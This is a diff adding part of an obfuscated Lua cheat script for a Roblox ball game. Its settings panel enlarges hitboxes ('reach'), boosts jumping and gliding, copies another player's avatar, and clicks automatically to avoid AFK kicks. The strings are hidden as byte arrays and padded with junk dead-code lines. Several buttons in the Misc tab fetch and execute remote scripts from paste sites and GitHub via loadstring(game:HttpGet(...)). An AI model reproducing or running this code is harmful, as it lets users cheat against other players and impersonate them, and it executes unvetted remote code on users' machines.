+TogBtn.Size=UDim2.new(1,0,0,isMobile and 44 or 36); 
+[==[ _8a4f16_ ]==]
+TogBtn.BackgroundColor3=CFG.C.ActiveBg; 
+[==[ xubatiiL4SC ]==]
+TogBtn.BackgroundTransparency=0.7; 
+do local __ec8371_=nil end
+TogBtn.BorderSizePixel=0; 
+TogBtn.Text=""; 
+TogBtn.AutoButtonColor=false; 
+[==[ npxixwoc_ad86 ]==]
+TogBtn.LayoutOrder=0; 
+TogBtn.ZIndex=5; 
+TogBtn.Parent=SBScroll; 
+corner(TogBtn,isMobile and 10 or 8)
+local togIconH=frame({Size=UDim2.new(0,isMobile and 22 or 18,0,isMobile and 22 or 18),AnchorPoint=Vector2.new(0,.5),Position=UDim2.new(0,isMobile and 8 or 7,.5,0),BackgroundTransparency=1,ZIndex=6,Parent=TogBtn}); 
+do local __68c0ca_=nil end
+iconMenu(togIconH)
+local TogLabel=label({Name=(function() local t=[76, 97, 98, 101, 108] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),Size=UDim2.new(1,-(isMobile and 38 or 34),1,0),Position=UDim2.new(0,isMobile and 36 or 32,0,0),BackgroundTransparency=1,Text=(function() return string.char(0x43, 0x6f, 0x6c, 0x6c, 0x61, 0x70, 0x73, 0x65) end)(),TextColor3=CFG.C.SubText,Font=F.Body,TextSize=isMobile and 15 or 12,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=6,Parent=TogBtn})
+do local _gifek6=nil end
+frame({Size=UDim2.new(1,0,0,1),BackgroundColor3=CFG.C.Border,BackgroundTransparency=0.6,BorderSizePixel=0,LayoutOrder=1,ZIndex=5,Parent=SBScroll})
+
+local PageArea=frame({Name=(function() return string.char(80, 97, 103, 101, 115) end)(),Size=UDim2.new(0,W-SBW,1,0),Position=UDim2.new(0,SBW,0,0),BackgroundTransparency=1,ClipsDescendants=true,Parent=Content})
+
+local State={ActiveTab=1,SidebarOpen=true,Dragging=false,DragStart=nil,StartPos=nil,Minimized=false}
+local Pages={}; local TabRefs={}
+
+local function buildReach(parent)
+    local sf=makeScrollPage(parent)
+    local ballSec=makeSection(sf,(function() local t=[66, 97, 108, 108, 32, 82, 101, 97, 99, 104] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),1)
+    makeSlider(ballSec,(function() return string.char(0x53, 0x69, 0x7a, 0x65) end)(),2,30,2,1,function(v) config.Reach=v; if tps then tps.Size=Vector3.new(v,v,v) end end,0.25)
+    rowDivider(ballSec,2)
+    makeDropdown(ballSec,(function() return string.char(70, 111, 114, 109, 97, 116) end)(),{(function() local t=[66, 97, 108, 108] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),(function() return string.char(0x42, 0x6c, 0x6f, 0x63, 0x6b) end)()},(function() return string.char(66, 97, 108, 108) end)(),3,function(v) config.ReachType=v; if tps then pcall(function() tps.Shape=Enum.PartType[v] end) end end)
+if false then local zocojiAi8n=1486 end
+    rowDivider(ballSec,4)
+    makeSlider(ballSec,(function() local t=[84, 114, 97, 110, 115, 112, 97, 114, 101, 110, 99, 121] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),0,100,85,5,function(v) config.ReachVisibility=v/100; if tps then tps.Transparency=v/100 end end)
+do local _dwrie_7ad2=nil end
+    rowDivider(ballSec,6)
+if false then local mcbom_3dd4=3121 end
+    makeToggle(ballSec,(function() return string.char(0x41, 0x75, 0x74, 0x6f, 0x20, 0x52, 0x65, 0x61, 0x63, 0x68, 0x20, 0x52, 0x65, 0x73, 0x65, 0x74) end)(),(function() return string.char(82, 101, 115, 101, 116, 32, 114, 101, 97, 99, 104, 32, 97, 102, 116, 101, 114, 32, 114, 101, 115, 112, 97, 119, 110) end)(),false,7,function(state)
+do local _qufedeSCU=nil end
+        if state then LocalPlayer.CharacterAdded:Connect(function() task.wait(0.5); if tps then tps.Size=Vector3.new(config.Reach,config.Reach,config.Reach) end end) end
+if false then local qmaify_92c0=4797 end
+    end)
+do local __f313c7_=nil end
+    rowDivider(ballSec,8)
+    makeButton(ballSec,(function() local t=[82, 101, 115, 101, 116, 32, 82, 101, 97, 99, 104] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),(function() return string.char(0x42, 0x61, 0x63, 0x6b, 0x20, 0x74, 0x6f, 0x20, 0x6f, 0x72, 0x69, 0x67, 0x69, 0x6e, 0x61, 0x6c, 0x20, 0x73, 0x69, 0x7a, 0x65) end)(),(function() return string.char(103, 104, 111, 115, 116) end)(),9,function() if tps then tps.Size=ReplicatedStorage.TPS.Size end end)
+
+    local legSec=makeSection(sf,(function() local t=[76, 101, 103, 32, 82, 101, 97, 99, 104] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),2)
+    makeToggle(legSec,(function() return string.char(0x45, 0x6e, 0x61, 0x62, 0x6c, 0x65, 0x20, 0x4c, 0x65, 0x67, 0x20, 0x52, 0x65, 0x61, 0x63, 0x68) end)(),nil,false,1,function(state)
+        config.LegReach=state
+        if state then local chr=LocalPlayer.Character; if chr then setupLegReach(chr) end; startLegReachLoop(); createLegVisualPart()
+        else cleanupLegReach() end
+[==[ _a0069f_ ]==]
+    end)
+[==[ pdeke_7b1e ]==]
+    rowDivider(legSec,2)
+    makeSlider(legSec,(function() return string.char(83, 121, 110, 99, 32, 40, 88, 47, 89, 47, 90, 41) end)(),1,30,5,3,function(v)
+if false then local jitibuwoLh1X=2058 end
+        config.LegReachDist=v; config.LegVisualSizeX=v; config.LegVisualSizeY=v; config.LegVisualSizeZ=v
+        if legVisualPart and legVisualPart.Parent then legVisualPart.Size=Vector3.new(v,v,v) end
+    end,0.25)
+if false then local nevagi3zNp=5697 end
+    rowDivider(legSec,4)
+    makeSlider(legSec,(function() local t=[83, 105, 122, 101, 32, 88] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),1,30,5,5,function(v) config.LegVisualSizeX=v; if legVisualPart and legVisualPart.Parent then legVisualPart.Size=Vector3.new(config.LegVisualSizeX,config.LegVisualSizeY,config.LegVisualSizeZ) end end,0.25)
+if false then local hckjqyxa_8600=9923 end
+    rowDivider(legSec,6)
+    makeSlider(legSec,(function() return string.char(0x53, 0x69, 0x7a, 0x65, 0x20, 0x59) end)(),1,30,5,7,function(v) config.LegVisualSizeY=v; if legVisualPart and legVisualPart.Parent then legVisualPart.Size=Vector3.new(config.LegVisualSizeX,config.LegVisualSizeY,config.LegVisualSizeZ) end end,0.25)
+do local __1a2e6b_=nil end
+    rowDivider(legSec,8)
+[==[ dccjvuks_38b6 ]==]
+    makeSlider(legSec,(function() return string.char(83, 105, 122, 101, 32, 90) end)(),1,30,5,9,function(v) config.LegVisualSizeZ=v; if legVisualPart and legVisualPart.Parent then legVisualPart.Size=Vector3.new(config.LegVisualSizeX,config.LegVisualSizeY,config.LegVisualSizeZ) end end,0.25)
+if false then local zyqeogv_7bfd=8768 end
+    rowDivider(legSec,10)
+[==[ _daf9e9_ ]==]
+    makeToggle(legSec,(function() local t=[83, 104, 111, 119, 32, 82, 101, 97, 99, 104] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),nil,false,11,function(state)
+if false then local papuSXp=2541 end
+        config.LegVisual=state; if legVisualPart and legVisualPart.Parent then legVisualPart.Transparency=(state and config.LegVisualTransp) or 1 end
+    end)
+    rowDivider(legSec,12)
+    makeDropdown(legSec,(function() return string.char(0x53, 0x68, 0x61, 0x70, 0x65) end)(),{(function() return string.char(66, 97, 108, 108) end)(),(function() local t=[66, 108, 111, 99, 107] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()},(function() return string.char(0x42, 0x61, 0x6c, 0x6c) end)(),13,function(v) config.LegVisualShape=v; applyLegVisualProps() end)
+
+[==[ iysqs_cbc4 ]==]
+    local xyzSec=makeSection(sf,(function() return string.char(88, 89, 90, 32, 72, 105, 116, 98, 111, 120, 32, 82, 101, 97, 99, 104) end)(),3)
+if false then local kaxaWfj=802 end
+    makeToggle(xyzSec,(function() local t=[69, 110, 97, 98, 108, 101, 32, 88, 89, 90, 32, 82, 101, 97, 99, 104] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),nil,false,1,function(v) legBoxEnabled=v; if v then startLegXYZ() else stopLegXYZ() end end)
+if false then local cpvinax_2fcb=519 end
+    rowDivider(xyzSec,2)
+    makeSlider(xyzSec,(function() return string.char(0x52, 0x65, 0x61, 0x63, 0x68, 0x20, 0x58) end)(),0,30,4,3,function(v) legBoxSize=Vector3.new(v,legBoxSize.Y,legBoxSize.Z); if legBoxEnabled then rebuildLegBox() end end)
+[==[ mumt_144c ]==]
+    rowDivider(xyzSec,4)
+[==[ gepacabut0rp ]==]
+    makeSlider(xyzSec,(function() return string.char(82, 101, 97, 99, 104, 32, 89) end)(),0,30,4,5,function(v) legBoxSize=Vector3.new(legBoxSize.X,v,legBoxSize.Z); if legBoxEnabled then rebuildLegBox() end end)
+    rowDivider(xyzSec,6)
+do local _quloLW=nil end
+    makeSlider(xyzSec,(function() local t=[82, 101, 97, 99, 104, 32, 90] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),0,25,4,7,function(v) legBoxSize=Vector3.new(legBoxSize.X,legBoxSize.Y,v); if legBoxEnabled then rebuildLegBox() end end)
+    rowDivider(xyzSec,8)
+    makeToggle(xyzSec,(function() return string.char(0x53, 0x68, 0x6f, 0x77, 0x20, 0x48, 0x69, 0x74, 0x62, 0x6f, 0x78) end)(),nil,true,9,function(v) legBoxTransparency=v and 0.5 or 1; if legBox then legBox.Transparency=legBoxTransparency end end)
+
+if false then local _ad102c_=3458 end
+    local distSec=makeSection(sf,(function() return string.char(68, 105, 115, 116, 97, 110, 99, 101, 32, 82, 101, 97, 99, 104) end)(),4)
+    makeToggle(distSec,(function() local t=[69, 110, 97, 98, 108, 101, 32, 68, 105, 115, 116, 97, 110, 99, 101, 32, 82, 101, 97, 99, 104] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),nil,false,1,function(v) distEnabled=v; restartDistConn() end)
+    rowDivider(distSec,2)
+[==[ aqre_9c65 ]==]
+    makeSlider(distSec,(function() return string.char(0x44, 0x69, 0x73, 0x74, 0x61, 0x6e, 0x63, 0x65) end)(),1,15,1,3,function(v) distReach=v; restartDistConn() end)
+
+    local headSec=makeSection(sf,(function() return string.char(72, 101, 97, 100, 32, 82, 101, 97, 99, 104) end)(),5)
+if false then local zesiyunC=2472 end
+    makeToggle(headSec,(function() local t=[69, 110, 97, 98, 108, 101, 32, 72, 101, 97, 100, 32, 82, 101, 97, 99, 104] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),nil,false,1,function(v) headEnabled=v; if v then startHead() else stopHead() end end)
+    rowDivider(headSec,2)
+    makeSlider(headSec,(function() return string.char(0x52, 0x65, 0x61, 0x63, 0x68, 0x20, 0x58) end)(),0,20,2,3,function(v) headSize=Vector3.new(v,headSize.Y,headSize.Z); if headEnabled then rebuildHeadBox() end end)
+[==[ bonuzU3 ]==]
+    rowDivider(headSec,4)
+do local _yojiWFP=nil end
+    makeSlider(headSec,(function() return string.char(82, 101, 97, 99, 104, 32, 89) end)(),0,25,3,5,function(v) headSize=Vector3.new(headSize.X,v,headSize.Z); headOffset=Vector3.new(headOffset.X,v/2.5,headOffset.Z); if headEnabled then rebuildHeadBox() end end)
+    rowDivider(headSec,6)
+    makeSlider(headSec,(function() local t=[82, 101, 97, 99, 104, 32, 90] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),0,25,2,7,function(v) headSize=Vector3.new(headSize.X,headSize.Y,v); if headEnabled then rebuildHeadBox() end end)
+    rowDivider(headSec,8)
+    makeToggle(headSec,(function() return string.char(0x48, 0x69, 0x64, 0x65, 0x20, 0x48, 0x69, 0x74, 0x62, 0x6f, 0x78) end)(),nil,false,9,function(v) headTransp=v and 1 or 0.5; if headBox then headBox.Transparency=headTransp end end)
+end
+
+if false then local zxtdivs_93fd=1012 end
+local function buildVisual(parent)
+do local __b969e5_=nil end
+    local sf=makeScrollPage(parent)
+    local card=makeSection(sf,(function() return string.char(66, 97, 108, 108, 32, 86, 105, 115, 117, 97, 108) end)(),1)
+do local _yoca714vr=nil end
+    makeSlider(card,(function() local t=[82, 101, 102, 108, 101, 99, 116, 97, 110, 99, 101] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),0,100,0,1,function(v) if tps then tps.Reflectance=v/100 end end)
+[==[ lfydwvg_6e5c ]==]
+    rowDivider(card,2)
+    makeSlider(card,(function() return string.char(0x52, 0x20, 0x28, 0x52, 0x65, 0x64, 0x29) end)(),0,255,255,3,function(v) tpsR=v; updateBallColor() end)
+[==[ sxpcx_0e70 ]==]
+    rowDivider(card,4)
+    makeSlider(card,(function() return string.char(71, 32, 40, 71, 114, 101, 101, 110, 41) end)(),0,255,255,5,function(v) tpsG=v; updateBallColor() end)
+[==[ giliJ7xi ]==]
+    rowDivider(card,6)
+    makeSlider(card,(function() local t=[66, 32, 40, 66, 108, 117, 101, 41] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),0,255,255,7,function(v) tpsB=v; updateBallColor() end)
+    rowDivider(card,8)
+[==[ fxskaxu_299c ]==]
+    makeToggle(card,(function() return string.char(0x4e, 0x65, 0x6f, 0x6e) end)(),(function() return string.char(78, 101, 111, 110, 32, 77, 97, 116, 101, 114, 105, 97, 108) end)(),false,9,function(s) if tps then tps.Material=(s and Enum.Material.Neon) or Enum.Material.SmoothPlastic end end)
+    rowDivider(card,10)
+    makeToggle(card,(function() local t=[70, 111, 114, 99, 101, 70, 105, 101, 108, 100] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),(function() return string.char(0x46, 0x6f, 0x72, 0x63, 0x65, 0x46, 0x69, 0x65, 0x6c, 0x64, 0x20, 0x4d, 0x61, 0x74, 0x65, 0x72, 0x69, 0x61, 0x6c) end)(),false,11,function(s) if tps then tps.Material=(s and Enum.Material.ForceField) or Enum.Material.SmoothPlastic end end)
+    rowDivider(card,12)
+[==[ _6bb8e7_ ]==]
+    makeToggle(card,(function() return string.char(71, 108, 97, 115, 115) end)(),(function() local t=[71, 108, 97, 115, 115, 32, 77, 97, 116, 101, 114, 105, 97, 108] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),false,13,function(s) if tps then tps.Material=(s and Enum.Material.Glass) or Enum.Material.SmoothPlastic end end)
+    rowDivider(card,14)
+    makeButton(card,(function() return string.char(0x53, 0x74, 0x61, 0x6e, 0x64, 0x61, 0x72, 0x64, 0x20, 0x43, 0x6f, 0x6c, 0x6f, 0x72) end)(),(function() return string.char(82, 101, 115, 116, 111, 114, 101, 32, 116, 104, 101, 32, 79, 114, 105, 103, 105, 110, 97, 108, 32, 67, 111, 108, 111, 114) end)(),(function() local t=[103, 104, 111, 115, 116] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),15,function()
+if false then local mrqudyuj_9a5a=6033 end
+        if tps then local ref=ReplicatedStorage.TPS; tps.Color=ref.Color; tpsR=math.floor(ref.Color.R*255); tpsG=math.floor(ref.Color.G*255); tpsB=math.floor(ref.Color.B*255); updateBallColor() end
+    end)
+do local __4a5e07_=nil end
+end
+
+local function buildLegVisual(parent)
+    local sf=makeScrollPage(parent)
+    local card=makeSection(sf,(function() return string.char(0x4c, 0x65, 0x67, 0x20, 0x56, 0x69, 0x73, 0x75, 0x61, 0x6c) end)(),1)
+[==[ wenelasa6IcAi ]==]
+    makeSlider(card,(function() return string.char(84, 114, 97, 110, 115, 112, 97, 114, 101, 110, 99, 121) end)(),0,100,0,1,function(v) config.LegVisualTransp=v/100; applyLegVisualProps() end)
+    rowDivider(card,2)
+if false then local kuxadozk=6556 end
+    makeSlider(card,(function() local t=[82, 101, 102, 108, 101, 99, 116, 97, 110, 99, 101] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),0,100,0,3,function(v) config.LegVisualReflect=v/100; applyLegVisualProps() end)
+if false then local _edf94b_=5402 end
+    rowDivider(card,4)
+    makeToggle(card,(function() return string.char(0x4e, 0x65, 0x6f, 0x6e) end)(),nil,false,5,function(s) config.LegVisualNeon=s; if s then config.LegVisualForceField=false; config.LegVisualGlass=false end; applyLegVisualProps() end)
+    rowDivider(card,6)
+    makeToggle(card,(function() return string.char(70, 111, 114, 99, 101, 70, 105, 101, 108, 100) end)(),nil,true,7,function(s) config.LegVisualForceField=s; if s then config.LegVisualNeon=false; config.LegVisualGlass=false end; applyLegVisualProps() end)
+    rowDivider(card,8)
+    makeToggle(card,(function() local t=[71, 108, 97, 115, 115] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),nil,false,9,function(s) config.LegVisualGlass=s; if s then config.LegVisualNeon=false; config.LegVisualForceField=false end; applyLegVisualProps() end)
+    rowDivider(card,10)
+    makeSlider(card,(function() return string.char(0x52, 0x20, 0x28, 0x52, 0x65, 0x64, 0x29) end)(),0,255,255,11,function(v) config.LegVisualR=v; applyLegVisualProps() end)
+    rowDivider(card,12)
+    makeSlider(card,(function() return string.char(71, 32, 40, 71, 114, 101, 101, 110, 41) end)(),0,255,100,13,function(v) config.LegVisualG=v; applyLegVisualProps() end)
+if false then local amjil_17d6=672 end
+    rowDivider(card,14)
+[==[ mesuwepaMlWaA ]==]
+    makeSlider(card,(function() local t=[66, 32, 40, 66, 108, 117, 101, 41] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),0,255,100,15,function(v) config.LegVisualB=v; applyLegVisualProps() end)
+    rowDivider(card,16)
+if false then local dlkjcyui_cbe1=3310 end
+    makeButton(card,(function() return string.char(0x52, 0x65, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x20, 0x50, 0x61, 0x72, 0x74) end)(),(function() return string.char(82, 101, 99, 114, 101, 97, 116, 101, 32, 116, 104, 101, 32, 118, 105, 115, 117, 97, 108, 32, 108, 101, 103) end)(),(function() local t=[103, 104, 111, 115, 116] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),17,function() if config.LegVisual then createLegVisualPart() end end)
+end
+
+local function buildMovement(parent)
+    local sf=makeScrollPage(parent)
+    local glideCard=makeSection(sf,(function() return string.char(0x47, 0x6c, 0x69, 0x64, 0x65) end)(),1)
+    makeToggle(glideCard,(function() return string.char(69, 110, 97, 98, 108, 101, 32, 71, 108, 105, 100, 101) end)(),nil,false,1,function(v) glideEnabled=v; restartGlide() end)
+    rowDivider(glideCard,2)
+    makeSlider(glideCard,(function() local t=[71, 108, 105, 100, 101, 32, 83, 116, 114, 101, 110, 103, 116, 104] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),1,10,4,3,function(v) glideStrength=v; restartGlide() end)
+if false then local _cd33a_=9498 end
+    local jumpCard=makeSection(sf,(function() return string.char(0x4a, 0x75, 0x6d, 0x70, 0x20, 0x50, 0x6f, 0x77, 0x65, 0x72) end)(),2)
+    makeToggle(jumpCard,(function() return string.char(69, 110, 97, 98, 108, 101, 32, 74, 117, 109, 112, 32, 80, 111, 119, 101, 114) end)(),nil,false,1,function(v) jpEnabled=v; if human then human.JumpPower=v and jpPower or 50 end end)
+    rowDivider(jumpCard,2)
+    makeSlider(jumpCard,(function() local t=[74, 117, 109, 112, 32, 80, 111, 119, 101, 114] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),50,120,50,3,function(v) jpPower=v; if jpEnabled and human then human.JumpPower=v end end)
+end
+
+if false then local _e86438_=8690 end
+local function buildAvatar(parent)
+do local _xjpfbjcd_9bd0=nil end
+    local sf=makeScrollPage(parent)
+    local card=makeSection(sf,(function() return string.char(0x41, 0x76, 0x61, 0x74, 0x61, 0x72, 0x20, 0x53, 0x74, 0x65, 0x61, 0x6c, 0x65, 0x72) end)(),1)
+    makeInput(card,(function() return string.char(84, 97, 114, 103, 101, 116, 32, 85, 115, 101, 114, 110, 97, 109, 101) end)(),(function() local t=[85, 115, 101, 114, 110, 97, 109, 101, 46, 46, 46] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),1,function(v)
+        if v=="" then return end; disguiseUser=v; disguiseActive=true
+        if LocalPlayer.Character then applyDisguise(LocalPlayer.Character) end
+        LocalPlayer.CharacterAdded:Connect(function(chr) chr:WaitForChild((function() return string.char(0x48, 0x75, 0x6d, 0x61, 0x6e, 0x6f, 0x69, 0x64) end)()); task.wait(0.2); if disguiseActive then applyDisguise(chr) end end)
+    end)
+do local _lvshfzfj_f52f=nil end
+    rowDivider(card,2)
+    makeButton(card,(function() return string.char(82, 101, 115, 101, 116, 32, 65, 118, 97, 116, 97, 114) end)(),(function() local t=[82, 101, 115, 101, 116, 32, 121, 111, 117, 114, 32, 111, 114, 105, 103, 105, 110, 97, 108, 32, 65, 118, 97, 116, 97, 114] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),(function() return string.char(0x64, 0x61, 0x6e, 0x67, 0x65, 0x72) end)(),3,function()
+        disguiseActive=false; disguiseUser=""
+        if LocalPlayer.Character then
+do local _muhrln_8d08=nil end
+            local hum=LocalPlayer.Character:FindFirstChildOfClass((function() return string.char(72, 117, 109, 97, 110, 111, 105, 100) end)())
+[==[ vafeAUa ]==]
+            if hum then hum:ApplyDescriptionClientServer(Players:GetHumanoidDescriptionFromUserId(LocalPlayer.UserId)) end
+do local _xiyurojj2Qc=nil end
+        end
+    end)
+end
+
+local function buildMisc(parent)
+    local sf=makeScrollPage(parent)
+    local reactCard=makeSection(sf,(function() local t=[82, 101, 97, 99, 116, 32, 83, 99, 114, 105, 112, 116, 115] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),1)
+do local _ysemw_a78d=nil end
+    makeButton(reactCard,(function() return string.char(0x55, 0x6c, 0x74, 0x69, 0x6d, 0x61, 0x74, 0x65, 0x20, 0x52, 0x65, 0x61, 0x63, 0x74) end)(),nil,(function() return string.char(112, 114, 105, 109, 97, 114, 121) end)(),1,function() loadstring(game:HttpGet((function() local t=[104, 116, 116, 112, 115, 58, 47, 47, 112, 46, 105, 112, 46, 102, 105, 47, 85, 118, 54, 119, 46, 116, 120, 116] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()))() end)
+[==[ gameKM ]==]
+    rowDivider(reactCard,2)
+do local _zyje_b22b=nil end
+    makeButton(reactCard,(function() return string.char(0x42, 0x65, 0x74, 0x74, 0x65, 0x72, 0x20, 0x52, 0x65, 0x61, 0x63, 0x74) end)(),nil,(function() return string.char(103, 104, 111, 115, 116) end)(),3,function() loadstring(game:HttpGet((function() local t=[104, 116, 116, 112, 115, 58, 47, 47, 112, 46, 105, 112, 46, 102, 105, 47, 122, 107, 82, 52, 46, 116, 120, 116] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()))() end)
+[==[ leziyodaCxL8i ]==]
+    rowDivider(reactCard,4)
+    makeButton(reactCard,(function() return string.char(0x49, 0x6e, 0x66, 0x69, 0x6e, 0x69, 0x74, 0x65, 0x20, 0x52, 0x65, 0x61, 0x63, 0x74) end)(),nil,(function() return string.char(103, 104, 111, 115, 116) end)(),5,function() loadstring(game:HttpGet((function() local t=[104, 116, 116, 112, 115, 58, 47, 47, 112, 46, 105, 112, 46, 102, 105, 47, 85, 113, 89, 73, 46, 116, 120, 116] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()))() end)
+    rowDivider(reactCard,6)
+[==[ bbxvo_a7b1 ]==]
+    makeButton(reactCard,(function() return string.char(0x49, 0x6e, 0x66, 0x69, 0x6e, 0x69, 0x74, 0x65, 0x20, 0x59, 0x69, 0x65, 0x6c, 0x64) end)(),(function() return string.char(65, 100, 109, 105, 110, 32, 67, 111, 109, 109, 97, 110, 100, 115) end)(),(function() local t=[103, 104, 111, 115, 116] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),7,function() loadstring(game:HttpGet((function() return string.char(0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x72, 0x61, 0x77, 0x2e, 0x67, 0x69, 0x74, 0x68, 0x75, 0x62, 0x75, 0x73, 0x65, 0x72, 0x63, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x65, 0x64, 0x67, 0x65, 0x69, 0x79, 0x2f, 0x69, 0x6e, 0x66, 0x69, 0x6e, 0x69, 0x74, 0x65, 0x79, 0x69, 0x65, 0x6c, 0x64, 0x2f, 0x6d, 0x61, 0x73, 0x74, 0x65, 0x72, 0x2f, 0x73, 0x6f, 0x75, 0x72, 0x63, 0x65) end)()))() end)
+
+    local toolsCard=makeSection(sf,(function() return string.char(84, 111, 111, 108, 115) end)(),2)
+    makeButton(toolsCard,(function() local t=[66, 97, 108, 108, 32, 84, 101, 108, 101, 112, 111, 114, 116] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),(function() return string.char(0x54, 0x65, 0x6c, 0x65, 0x70, 0x6f, 0x72, 0x74, 0x20, 0x74, 0x6f, 0x20, 0x74, 0x68, 0x65, 0x20, 0x62, 0x61, 0x6c, 0x6c) end)(),(function() return string.char(112, 114, 105, 109, 97, 114, 121) end)(),1,function()
+        local t=workspace.TPSSystem:FindFirstChild((function() local t=[84, 80, 83] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)())
+[==[ _5a931d_ ]==]
+        if t and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild((function() return string.char(0x48, 0x75, 0x6d, 0x61, 0x6e, 0x6f, 0x69, 0x64, 0x52, 0x6f, 0x6f, 0x74, 0x50, 0x61, 0x72, 0x74) end)()) then
+            LocalPlayer.Character.HumanoidRootPart.CFrame=t.CFrame+Vector3.new(0,3,0)
+        end
+    end)
+    rowDivider(toolsCard,2)
+    makeToggle(toolsCard,(function() return string.char(66, 97, 108, 108, 32, 83, 112, 101, 99, 116, 97, 116, 101) end)(),(function() local t=[67, 97, 109, 101, 114, 97, 32, 115, 112, 101, 99, 116, 97, 116, 101, 32, 111, 110, 32, 116, 104, 101, 32, 98, 97, 108, 108] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),false,3,function(state)
+if false then local aakprm_5196=1258 end
+        local t=workspace.TPSSystem:FindFirstChild((function() return string.char(0x54, 0x50, 0x53) end)()); workspace.CurrentCamera.CameraSubject=(state and t) or LocalPlayer.Character
+    end)
+    rowDivider(toolsCard,4)
+    makeToggle(toolsCard,(function() return string.char(65, 110, 116, 105, 32, 65, 70, 75) end)(),(function() local t=[80, 114, 101, 118, 101, 110, 116, 32, 98, 101, 105, 110, 103, 32, 107, 105, 99, 107, 101, 100, 32, 102, 111, 114, 32, 105, 110, 97, 99, 116, 105, 118, 105, 116, 121] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),false,5,function(state)
+        antiAfkState=state
+        if state then task.spawn(function()
+            while antiAfkState do pcall(function() local VU=game:GetService((function() return string.char(0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x55, 0x73, 0x65, 0x72) end)()); VU:CaptureController(); VU:ClickButton2(Vector2.new()) end); task.wait(60) end
+        end) end
+    end)
+end
+
+do local _uzzbrfsf_e899=nil end
+local function buildAbout(parent)
+    local sf=makeScrollPage(parent)
+    local heroWrap=frame({Size=UDim2.new(1,0,0,isMobile and 140 or 112),BackgroundTransparency=1,LayoutOrder=0,Parent=sf})
+    local heroBase=frame({Size=UDim2.new(1,0,1,0),BackgroundColor3=Color3.fromRGB(20,16,40),BorderSizePixel=0,Parent=heroWrap}); corner(heroBase,isMobile and 14 or 12)
+    local heroGrad=Instance.new((function() return string.char(85, 73, 71, 114, 97, 100, 105, 101, 110, 116) end)()); heroGrad.Color=ColorSequence.new(Color3.fromRGB(80,40,180),Color3.fromRGB(16,12,30)); heroGrad.Rotation=135; heroGrad.Transparency=NumberSequence.new(0.25); heroGrad.Parent=heroBase
+    cardGlow(heroBase,CFG.C.Accent); stroke(heroBase,Color3.fromRGB(60,40,120),1,0.5)
+if false then local honbsrw_83d8=7183 end
+    local verPill=frame({Size=UDim2.new(0,isMobile and 70 or 58,0,isMobile and 22 or 18),AnchorPoint=Vector2.new(1,0),Position=UDim2.new(1,-isMobile and 14 or 12,0,isMobile and 14 or 12),BackgroundColor3=CFG.C.Accent,BackgroundTransparency=0.72,BorderSizePixel=0,ZIndex=6,Parent=heroBase}); corner(verPill,isMobile and 11 or 9)
+    label({Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Text=CFG.Version,TextColor3=Color3.fromRGB(200,180,255),Font=F.Mono,TextSize=isMobile and 12 or 10,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,ZIndex=7,Parent=verPill})
+do local __33540d_=nil end
+    label({Size=UDim2.new(1,-90,0,isMobile and 46 or 38),Position=UDim2.new(0,isMobile and 18 or 16,0,isMobile and 36 or 30),BackgroundTransparency=1,Text=CFG.Name,TextColor3=Color3.fromRGB(235,220,255),Font=F.Title,TextSize=isMobile and 28 or 30,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=8,Parent=heroBase})
+    label({Size=UDim2.new(1,-24,0,isMobile and 22 or 18),Position=UDim2.new(0,isMobile and 18 or 16,0,isMobile and 94 or 76),BackgroundTransparency=1,Text=(function() local t=[84, 104, 101, 32, 98, 101, 115, 116, 32, 102, 111, 114, 32, 121, 111, 117, 33, 32, 60, 51] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),TextColor3=Color3.fromRGB(110,80,180),Font=F.Mono,TextSize=isMobile and 12 or 10,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=8,Parent=heroBase})
+    local userWrap=frame({Size=UDim2.new(1,0,0,isMobile and 72 or 58),BackgroundTransparency=1,LayoutOrder=1,Parent=sf})
